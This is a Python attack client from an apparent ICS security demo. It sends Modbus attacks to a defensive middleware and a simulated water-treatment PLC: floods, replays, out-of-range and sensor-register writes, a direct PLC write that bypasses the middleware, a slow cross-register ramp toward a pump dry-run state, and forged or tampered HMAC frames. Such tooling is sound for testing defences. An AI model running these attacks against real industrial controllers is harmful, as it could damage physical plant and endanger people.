"""
attacker/attacker.py

Real Modbus attack client for the Industrial Mind demo.

Middleware:
    <IM_MIDDLEWARE_HOST>:5021

PLC:
    <IM_PLC_HOST>:5020

Attacks (original):
    flood                  signed burst above the 5 req/s limit     -> RATE_LIMIT_EXCEEDED
    impossible-command     signed out-of-range actuator value        -> OUT_OF_BOUNDS
    sensor-write            signed write to a read-only sensor        -> WRITE_TO_SENSOR_REGISTER
    replay                 byte-identical re-send of a signed frame  -> REPLAY_DETECTED
    false-injection        legit command, then direct PLC write      (bypasses middleware)

Attacks (new):
    cross-register         low-and-slow multi-register attack: each step is
                           in-bounds and within rate limits, but the combined
                           raw-water pump/valve state is unsafe
                           -> CROSS_REGISTER_VIOLATION
    hmac-missing           plain unsigned FC6 write                  -> HMAC_MISSING
    hmac-tamper            valid signed frame, value altered in transit -> HMAC_INVALID
    hmac-forged            frame signed with a guessed key           -> HMAC_INVALID
    delayed-replay         correctly signed frame that is 5 minutes old -> HMAC_EXPIRED

Threat model:
    flood / impossible-command / replay / cross-register / delayed-replay model
    a COMPROMISED ENGINEERING WORKSTATION that holds the shared HMAC key
    (insider). HMAC cannot stop an attacker who owns the key; the cyber rate /
    replay checks and the Physical Agent must. The hmac-* attacks model an
    external attacker WITHOUT the key.

Source IP:
    The middleware records the real TCP source address. To attack from a
    different address, bind the client with --source-ip. On Linux any
    127.x.y.z address works out of the box; on macOS add an alias first:
        sudo ifconfig lo0 alias 127.0.0.2 up
    Or run the attacker on another machine with --host <middleware-ip>.

Two families (Phase 8):
    FIXED, scripted attacks (above): identical every run, for live-demo reliability.
        The three DEMO attacks are: flood, impossible-command, cross-register.
        The rest (sensor-write, replay, false-injection, hmac-*, delayed-replay) are fixed protocol-level probes.
    RANDOMISED attacks (`random`): target register, timing, intensity, step size and counts are drawn per run
        from distributions (attacker/scenarios.py); the seed is printed so any run can be reproduced.
        Types: freeze / ramp / cross-register  (SWaT-derived behaviours)
               impossible-command / flood / replay  (SYNTHETIC EXTENSION: SWaT has no network-layer attacks)

        python attacker/attacker.py random --type ramp                 # new parameters every run
        python attacker/attacker.py random --type flood --seed 42      # reproducible
        python attacker/attacker.py random --dry-run --count 5         # print plans, send nothing
        python attacker/attacker.py random --log-file logs/attacks.jsonl

Usage:

    python attacker/attacker.py flood
    python attacker/attacker.py impossible-command
    python attacker/attacker.py sensor-write
    python attacker/attacker.py replay
    python attacker/attacker.py false-injection
    python attacker/attacker.py cross-register
    python attacker/attacker.py hmac-missing --source-ip 127.0.0.2
    python attacker/attacker.py hmac-tamper  --source-ip 127.0.0.2,127.0.0.3
"""

from __future__ import annotations

import argparse
import json
import os
import secrets
import sys
import time
from typing import Dict, List, Optional

# Allow `python attacker/attacker.py ...` as well as `python -m attacker.attacker`.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient  # noqa: E402

from core.interfaces import (  # noqa: E402
    MACHINES,
    NUM_REGISTERS,
    FRAME_BASE,
    MV101,
    P101,
    LIT101,
    to_raw,
    from_raw,
)
from attacker import scenarios  # noqa: E402
from core import hmac_auth, netconfig# noqa: E402


MIDDLEWARE_HOST = netconfig.MIDDLEWARE_HOST   # env IM_MIDDLEWARE_HOST/PORT, --host/--port
MIDDLEWARE_PORT = netconfig.MIDDLEWARE_PORT

PLC_HOST = netconfig.PLC_HOST                  # env IM_PLC_HOST/PORT, --plc-host/--plc-port
PLC_PORT = netconfig.PLC_PORT

UNIT_ID = 1

_NAME = {m["register"]: m["name"] for m in MACHINES}

# Set from the command line.
_SOURCE_IP = None


# ---------------------------------------------------------
# MODBUS CLIENT HELPER
# ---------------------------------------------------------

def connect(host: str, port: int) -> Optional[ModbusTcpClient]:

    kwargs = {}
    if _SOURCE_IP:
        kwargs["source_address"] = (_SOURCE_IP, 0)

    client = ModbusTcpClient(
        host=host,
        port=port,
        timeout=2,
        **kwargs
    )

    try:
        ok = client.connect()
    except OSError as e:
        ok = False
        print(f"[ATTACKER] Socket error: {e}")

    if not ok:

        print(
            f"[ATTACKER] Failed to connect to "
            f"{host}:{port}"
            + (f" from {_SOURCE_IP}" if _SOURCE_IP else "")
        )

        if _SOURCE_IP:
            print(
                "[ATTACKER] Hint: the source address must exist on this host "
                "(macOS: sudo ifconfig lo0 alias "
                f"{_SOURCE_IP} up)"
            )

        return None

    print(
        f"[ATTACKER] Connected to "
        f"{host}:{port}"
        + (f" from {_SOURCE_IP}" if _SOURCE_IP else "")
    )

    return client


def write_register(
    client: ModbusTcpClient,
    register: int,
    value: float,
) -> bool:
    """Plain, UNSIGNED single-register write (engineering units)."""

    raw = to_raw(value)

    result = client.write_register(
        address=register,
        value=raw,
        slave=UNIT_ID,
    )

    if result.isError():

        print(
            f"[ATTACKER] Write failed: "
            f"register={register}, value={value}"
        )

        return False

    print(
        f"[ATTACKER] Unsigned write sent: "
        f"{_NAME.get(register, register)}={value}"
    )

    return True


def send_frame(client: ModbusTcpClient, frame: List[int], label: str) -> bool:
    result = client.write_registers(
        address=FRAME_BASE,
        values=frame,
        slave=UNIT_ID,
    )

    if result.isError():
        print(f"[ATTACKER] Frame rejected at Modbus level: {label}")
        return False

    print(f"[ATTACKER] Frame sent: {label}")
    return True


def write_signed(client: ModbusTcpClient, register: int, value: float,
                 key: Optional[bytes] = None, timestamp_ms: Optional[int] = None) -> bool:
    """Signed command frame. key=None uses the shared (stolen) key."""
    frame = hmac_auth.build_frame(register, value, key=key, timestamp_ms=timestamp_ms)
    return send_frame(client, frame, f"signed {_NAME.get(register, register)}={value}")


def read_plant(client: ModbusTcpClient) -> Dict[int, float]:
    result = client.read_holding_registers(0, count=NUM_REGISTERS, slave=UNIT_ID)
    if result.isError():
        return {}
    return {m["register"]: from_raw(raw) for m, raw in zip(MACHINES, result.registers)}


# ---------------------------------------------------------
# ATTACK 1 — FLOOD
# ---------------------------------------------------------

def flood_attack() -> None:

    print("\n[ATTACK] RATE-LIMIT FLOOD")

    client = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if client is None:
        return

    try:

        base = read_plant(client).get(MV101, 0.0)

        # More than the cyber-agent limit of
        # 5 requests / second. Tiny moves so the
        # rate limiter is what stops them.

        for i in range(10):

            write_signed(
                client,
                register=MV101,
                value=round(base + 0.1 * (i + 1), 1)
            )

            time.sleep(0.05)

    finally:

        client.close()

    print("[ATTACK] Flood complete.")


# ---------------------------------------------------------
# ATTACK 2 — IMPOSSIBLE COMMAND
# ---------------------------------------------------------

def impossible_command_attack() -> None:

    print("\n[ATTACK] IMPOSSIBLE COMMAND")

    client = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if client is None:
        return

    try:

        # Raw Water Pump safe range:
        # 0-100 %

        write_signed(
            client,
            register=P101,
            value=999
        )

    finally:

        client.close()

    print(
        "[ATTACK] Impossible command complete."
    )


# ---------------------------------------------------------
# ATTACK 2b — SENSOR WRITE
# ---------------------------------------------------------

def sensor_write_attack() -> None:
    """A signed, perfectly in-range write aimed at a SENSOR register. Only
    actuator registers accept commands; the Physical Agent must drop this
    regardless of value -> WRITE_TO_SENSOR_REGISTER."""

    print("\n[ATTACK] SENSOR WRITE (command to a read-only register)")

    client = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if client is None:
        return

    try:

        # LIT101 (Raw Tank Level) is a sensor, 0-1000 mm. The value itself
        # is in-bounds; the attack is writing to a sensor at all.

        write_signed(
            client,
            register=LIT101,
            value=500.0
        )

    finally:

        client.close()

    print("[ATTACK] Sensor write complete.")


# ---------------------------------------------------------
# ATTACK 3 — REPLAY
# ---------------------------------------------------------

def replay_attack() -> None:

    print("\n[ATTACK] REPLAY")

    client = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if client is None:
        return

    try:

        register = MV101
        value = round(read_plant(client).get(register, 0.0) + 0.5, 1)

        # Capture one legitimate signed frame ...
        frame = hmac_auth.build_frame(register, value)

        send_frame(client, frame, f"original {_NAME[register]}={value}")

        time.sleep(0.05)

        # ... and send the exact same bytes again.
        # Valid HMAC, but the nonce was already used.
        send_frame(client, frame, f"REPLAYED {_NAME[register]}={value}")

    finally:

        client.close()

    print("[ATTACK] Replay complete.")


# ---------------------------------------------------------
# ATTACK 4 — FALSE INJECTION
# ---------------------------------------------------------

def false_injection_attack() -> None:

    print("\n[ATTACK] FALSE INJECTION")

    # -----------------------------------------------------
    # STEP 1
    # Legitimate command through middleware
    # -----------------------------------------------------

    middleware = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if middleware is None:
        return

    try:

        current = read_plant(middleware).get(MV101, 0.0)

        write_signed(
            middleware,
            register=MV101,
            value=round(current + 1.0, 1)
        )

    finally:

        middleware.close()

    time.sleep(0.3)

    # -----------------------------------------------------
    # STEP 2
    # Direct spoofed write to PLC
    # -----------------------------------------------------

    print(
        "[ATTACK] Sending direct PLC spoof..."
    )

    plc = connect(
        PLC_HOST,
        PLC_PORT
    )

    if plc is None:
        return

    try:

        # Deliberately different, misleading value on the stage-1
        # inlet valve - bypasses the middleware entirely.

        write_register(
            plc,
            register=MV101,
            value=0
        )

    finally:

        plc.close()

    print(
        "[ATTACK] False injection complete."
    )


# ---------------------------------------------------------
# ATTACK 5 — CROSS-REGISTER CORRELATION
# ---------------------------------------------------------

def _wait_until_quiet(client: ModbusTcpClient, register: int, quiet: float = 2.5,
                      timeout: float = 20.0) -> None:
    """
    Wait until the register has not changed for `quiet` seconds, i.e. nobody
    (including the legitimate operator) has moved it recently. The physical
    rate-of-change check measures time since the register last settled, so a
    stealthy attacker only steps a register that has been still for a while.
    """
    deadline = time.time() + timeout
    last = read_plant(client).get(register)
    still_since = time.time()
    while time.time() < deadline:
        time.sleep(0.25)
        now_val = read_plant(client).get(register)
        if now_val != last:
            last, still_since = now_val, time.time()
        elif time.time() - still_since >= quiet:
            return


def _ramp(client: ModbusTcpClient, register: int, goal: float, step: float, wait: float,
          max_blocked: int = 3) -> bool:
    """
    Walk one register to `goal` in small signed steps, each within bounds
    and within the physical rate-of-change limit. Returns True if the goal
    was reached, False if the middleware kept refusing the next step.
    """
    name = _NAME[register]
    blocked = 0

    while True:
        current = read_plant(client).get(register)
        if current is None:
            print("[ATTACKER] Could not read plant state.")
            return False

        if abs(current - goal) < 0.5:
            return True

        _wait_until_quiet(client, register)
        current = read_plant(client).get(register, current)
        if abs(current - goal) < 0.5:
            return True

        delta = max(-step, min(step, goal - current))
        target = round(current + delta, 1)

        print(f"[ATTACK]   {name}: {current:.1f} -> {target:.1f}")
        write_signed(client, register, target)
        time.sleep(wait)

        after = read_plant(client).get(register, current)

        # No progress at all toward the step target -> the middleware
        # dropped it. (Partial progress means the legitimate SCADA
        # operator issued its own setpoint meanwhile; just continue.)
        progress = (after - current) / (target - current) if target != current else 1.0
        if progress < 0.3:
            blocked += 1
            print(f"[ATTACK]   {name} step NOT applied (middleware blocked it) [{blocked}/{max_blocked}]")
            if blocked >= max_blocked:
                return False


def cross_register_attack() -> None:

    print("\n[ATTACK] CROSS-REGISTER CORRELATION (low and slow)")
    print("[ATTACK] Goal: RAW_PUMP_DRY_RUN - P101 >= 60% with MV101 <= 10% (raw tank runs dry).")
    print("[ATTACK] Every single command stays inside its own safe range and ramp rate.")

    client = connect(
        MIDDLEWARE_HOST,
        MIDDLEWARE_PORT
    )

    if client is None:
        return

    try:

        print("[ATTACK] Stage 1: close the inlet valve (safe on its own - pump is low)")
        closed = _ramp(client, MV101, goal=5.0, step=10.0, wait=3.0)

        if not closed:
            # The pump is already above the dry-run threshold, so closing the inlet completes the unsafe combination.
            print("[ATTACK] Middleware refused the step that completes the unsafe combination (inlet valve held above "
                  "the dry-run threshold while the pump is fast). Unsafe state PREVENTED.")
        else:
            print("[ATTACK] Stage 2: raise the raw-water pump speed (each step safe on its own)")
            reached = _ramp(client, P101, goal=70.0, step=10.0, wait=3.0)

            if reached:
                print("[ATTACK] Both goals reached - combined unsafe state was NOT prevented "
                      "(check that the plant was not already unsafe, e.g. after false-injection).")
            else:
                print("[ATTACK] Middleware refused the step that completes the unsafe combination.")

    finally:

        client.close()

    print("[ATTACK] Cross-register attack complete.")


# ---------------------------------------------------------
# ATTACK 6..9 — HMAC
# ---------------------------------------------------------

def hmac_missing_attack() -> None:

    print("\n[ATTACK] HMAC MISSING (unsigned command)")

    client = connect(MIDDLEWARE_HOST, MIDDLEWARE_PORT)
    if client is None:
        return

    try:
        current = read_plant(client).get(MV101, 32.0)
        # A perfectly safe value - the only problem is that it is unsigned.
        write_register(client, MV101, round(current + 1.0, 1))
    finally:
        client.close()

    print("[ATTACK] HMAC missing complete.")


def hmac_tamper_attack() -> None:

    print("\n[ATTACK] HMAC TAMPER (man-in-the-middle value change)")

    client = connect(MIDDLEWARE_HOST, MIDDLEWARE_PORT)
    if client is None:
        return

    try:
        current = read_plant(client).get(P101, 50.0)
        frame = hmac_auth.build_frame(P101, round(current + 1.0, 1))

        # Intercepted in transit: change the value, keep the original tag.
        frame[2] = to_raw(95.0)

        send_frame(client, frame, "tampered P101=95.0 (original tag)")
    finally:
        client.close()

    print("[ATTACK] HMAC tamper complete.")


def hmac_forged_attack() -> None:

    print("\n[ATTACK] HMAC FORGED (attacker guesses the key)")

    client = connect(MIDDLEWARE_HOST, MIDDLEWARE_PORT)
    if client is None:
        return

    try:
        wrong_key = secrets.token_hex(32).encode()
        current = read_plant(client).get(MV101, 32.0)
        write_signed(client, MV101, round(current + 1.0, 1), key=wrong_key)
    finally:
        client.close()

    print("[ATTACK] HMAC forged complete.")


def delayed_replay_attack() -> None:

    print("\n[ATTACK] DELAYED REPLAY (valid signature, captured 5 minutes ago)")

    client = connect(MIDDLEWARE_HOST, MIDDLEWARE_PORT)
    if client is None:
        return

    try:
        current = read_plant(client).get(MV101, 32.0)
        old_ts = int((time.time() - 300) * 1000)
        write_signed(client, MV101, round(current + 1.0, 1), timestamp_ms=old_ts)
    finally:
        client.close()

    print("[ATTACK] Delayed replay complete.")


# ---------------------------------------------------------
# RANDOMISED ATTACKS (plans come from attacker/scenarios.py)
# ---------------------------------------------------------

DEMO_ATTACKS = ("flood", "impossible-command", "cross-register")   # fixed-timing, demo-reliable


def run_plan(plan: dict) -> List[dict]:
    """Execute a plan over Modbus against the middleware. Returns one record per step."""
    print(f"\n[ATTACK] RANDOMISED {plan['type'].upper()} seed={plan['seed']} origin={plan['origin']} "
          f"ranges={plan['ranges_from']}")
    print(f"[ATTACK] params: {json.dumps(plan['params'])}")
    client = connect(MIDDLEWARE_HOST, MIDDLEWARE_PORT)
    if client is None:
        return []
    sent: Dict[int, List[int]] = {}
    records: List[dict] = []
    t0 = time.time()
    try:
        for i, st in enumerate(plan["steps"]):
            wait = st["t"] - (time.time() - t0)
            if wait > 0:
                time.sleep(wait)
            if st["kind"] == "replay_of":
                ok = send_frame(client, sent[st["ref"]], f"REPLAYED {st['tag']}={st['value']}")
            else:
                frame = hmac_auth.build_frame(st["register"], st["value"])
                sent[i] = frame
                ok = send_frame(client, frame, f"signed {st['tag']}={st['value']}")
            records.append({"step": i, "t": st["t"], "kind": st["kind"], "register": st["register"], "tag": st["tag"],
                            "value": st["value"], "sent": bool(ok), "wall_time": round(time.time(), 3)})
    finally:
        client.close()
    print(f"[ATTACK] {plan['type']} complete ({len(records)} frames).")
    return records


def random_attack(attack_type: Optional[str], seed: Optional[int], dry_run: bool, count: int,
                  log_file: Optional[str]) -> None:
    for n in range(count):
        # one independent seed per run unless the user pinned one
        run_seed = int(seed) + n if seed is not None else secrets.randbelow(2**31)
        rng_type = attack_type or sorted(scenarios.TYPES)[run_seed % len(scenarios.TYPES)]
        state = None
        if not dry_run:
            probe = connect(MIDDLEWARE_HOST, MIDDLEWARE_PORT)
            if probe is not None:
                state = read_plant(probe) or None
                probe.close()
        plan = scenarios.make_plan(rng_type, run_seed, state, scenarios.load_profile())
        if dry_run:
            print(json.dumps({k: plan[k] for k in ("type", "seed", "origin", "ranges_from", "params")}))
            records: List[dict] = []
        else:
            records = run_plan(plan)
        if log_file:
            os.makedirs(os.path.dirname(os.path.abspath(log_file)), exist_ok=True)
            with open(log_file, "a") as fh:
                fh.write(json.dumps({"type": plan["type"], "seed": plan["seed"], "origin": plan["origin"],
                                     "ranges_from": plan["ranges_from"], "params": plan["params"],
                                     "dry_run": dry_run, "records": records}) + "\n")


# ---------------------------------------------------------
# MAIN
# ---------------------------------------------------------

ATTACKS = {
    "flood": flood_attack,
    "impossible-command": impossible_command_attack,
    "sensor-write": sensor_write_attack,
    "replay": replay_attack,
    "false-injection": false_injection_attack,
    "cross-register": cross_register_attack,
    "hmac-missing": hmac_missing_attack,
    "hmac-tamper": hmac_tamper_attack,
    "hmac-forged": hmac_forged_attack,
    "delayed-replay": delayed_replay_attack,
}


def main() -> None:

    global _SOURCE_IP, MIDDLEWARE_HOST, MIDDLEWARE_PORT, PLC_HOST, PLC_PORT

    parser = argparse.ArgumentParser(description="Industrial Mind attack client")
    parser.add_argument("attack", nargs="?", choices=sorted(ATTACKS) + ["random"])
    parser.add_argument("--type", choices=sorted(scenarios.TYPES), default=None,
                        help="random: attack type (default: varies with the seed)")
    parser.add_argument("--seed", type=int, default=None, help="random: reproducible run (default: fresh seed each run)")
    parser.add_argument("--count", type=int, default=1, help="random: number of attacks to run")
    parser.add_argument("--dry-run", action="store_true", help="random: print the plan(s), send nothing")
    parser.add_argument("--log-file", default=None, help="random: append plan + per-frame records as JSONL")
    parser.add_argument(
        "--source-ip",
        default="",
        help="Local IP(s) to attack from, comma-separated (e.g. 127.0.0.2,127.0.0.3). "
             "Default: OS-chosen address.",
    )
    parser.add_argument("--host", default=MIDDLEWARE_HOST, help="Middleware host")
    parser.add_argument("--port", type=int, default=MIDDLEWARE_PORT, help="Middleware port")
    parser.add_argument("--plc-host", default=PLC_HOST)
    parser.add_argument("--plc-port", type=int, default=PLC_PORT)

    args = parser.parse_args()

    if not args.attack:
        parser.print_help()
        return

    MIDDLEWARE_HOST, MIDDLEWARE_PORT = args.host, args.port
    PLC_HOST, PLC_PORT = args.plc_host, args.plc_port

    sources = [s.strip() for s in args.source_ip.split(",") if s.strip()] or [None]

    for src in sources:
        _SOURCE_IP = src
        if args.attack == "random":
            random_attack(args.type, args.seed, args.dry_run, args.count, args.log_file)
            continue
        ATTACKS[args.attack]()
        if len(sources) > 1:
            time.sleep(1.2)   # keep per-source bursts separate


if __name__ == "__main__":

    main()
